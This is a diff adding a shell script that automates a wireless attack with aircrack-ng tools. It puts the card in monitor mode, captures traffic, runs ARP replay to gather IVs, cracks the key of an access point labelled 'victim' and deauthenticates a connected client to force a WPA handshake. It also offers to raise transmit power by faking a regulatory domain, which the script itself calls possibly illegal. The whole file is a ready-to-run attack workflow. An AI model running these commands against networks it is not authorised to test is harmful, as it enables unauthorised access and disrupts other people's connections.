@@ -1,0 +1,98 @@
+#!/bin/sh
+
+# fill in values taken from iwlist scan
+channel=11
+ownmac=00:ba:db:01:00:00
+ap_mac=00:ca:fe:00:00:00
+essid=victim
+wlanif=wlan0
+# monitor interface assigned by airmon-ng(mon0)/airmon-zc(wlan0mon)
+monitor=${wlanif}mon
+
+# you can override the above values by putting them into ./aircrack-vars.sh
+[ -e ./aircrack-vars.sh ] && . ./aircrack-vars.sh
+
+[ x$1 = x ] && {
+	echo "usage: $0 [mon|scan|test|dump|assoc|arp(r)|crack(k)|deauth|stopmon|powerup]"
+	echo "run each of the commands in the above order"
+	echo "and all of them except the first 2 in an own term"
+	echo "deauth requires as additional parameter the mac of the client"
+	echo "powerup boosts the txpower to 30 mw which can be handy but may be illegal"
+	exit 1
+}
+
+[ x$1 = xpowerup ] && {
+	[ -z "$2" ] && {
+	echo "powerup requires a wlan interface name as second param"
+	echo "note that boosting your power to 30mw may be illegal, consult your lawyer"
+	exit 1
+	}
+	# set regulatory domain to BOLIVIA and boost txpower to max
+	# http://null-byte.wonderhowto.com/how-to/hack-wi-fi-creating-evil-twin-wireless-access-point-eavesdrop-data-0147919/
+	iw reg set BO && iwconfig $2 txpower 30 && \
+	echo "successfully set tx power of $2 to 30mw" && exit 0
+	exit 1
+}
+
+[ x$ap_mac = x00:ca:fe:00:00:00 ] && { 
+	echo "error: you need to create a local config file, see $0 source:" >&2
+	head -n 12 "$0" | tail -n 10
+	exit 1
+}
+
+[ x$1 = xmon ] && airmon-ng start $wlanif $channel
+
+# all of the below commands require that monitor device was set up with "mon"
+
+# test injection
+[ x$1 = xtest ] && aireplay-ng -9 -a $ap_mac -e "$essid" $monitor
+
+# capture traffic - you need to capture at least 20-40K IVs
+[ x$1 = xdump ] && airodump-ng -c $channel --bssid $ap_mac -w output $monitor
+
+# capture traffic and look around who's there
+[ x$1 = xscan ] && airodump-ng -w output $monitor
+
+# associate with ap - you eventually want to call this in a loop with sleep 60
+[ x$1 = xassoc ] && {
+	shift
+	aireplay-ng -1 0 -a $ap_mac -e "$essid" -h $ownmac $monitor "$@"
+
+}
+
+# arp attack
+[ x$1 = xarp ] && aireplay-ng -3 -b $ap_mac -h $ownmac $monitor
+
+# if you already captured an arp packet in a previous run
+if [ x$1 = xarpr ] ; then
+	repl=
+	for i in replay_arp*.cap ; do
+		if [ -e "$i" ] && [ $(wc -c "$i" | cut -d " " -f 1) -gt 64 ] ; then
+			repl="$i"
+			break
+		fi
+	done
+	[ -n "$repl" ] && aireplay-ng -3 -b $ap_mac -h $ownmac -r "$repl" $monitor
+	[ -z "$repl" ] && echo "no sufficient capture file found"
+fi
+
+[ x$1 = xcrack ] && aircrack-ng -s -b $ap_mac output*.cap
+
+# alternate crack method - doesn't stop when out of IVs but apparently
+# requires a lot more of them
+[ x$1 = xcrackk ] && aircrack-ng -K -b $ap_mac output*.cap
+
+# deauth a connected client to force a wpa-handshake to be established
+if [ x$1 = xdeauth ] ; then
+	if [ x$2 = x ] ; then
+		echo "need client mac address!" >&2
+		exit 1
+	fi
+	victim=$2
+	shift
+	shift
+	aireplay-ng -0 1 -a $ap_mac -c $victim $monitor "$@"
+fi
+
+[ x$1 = xstopmon ] && airmon-ng stop $monitor
+
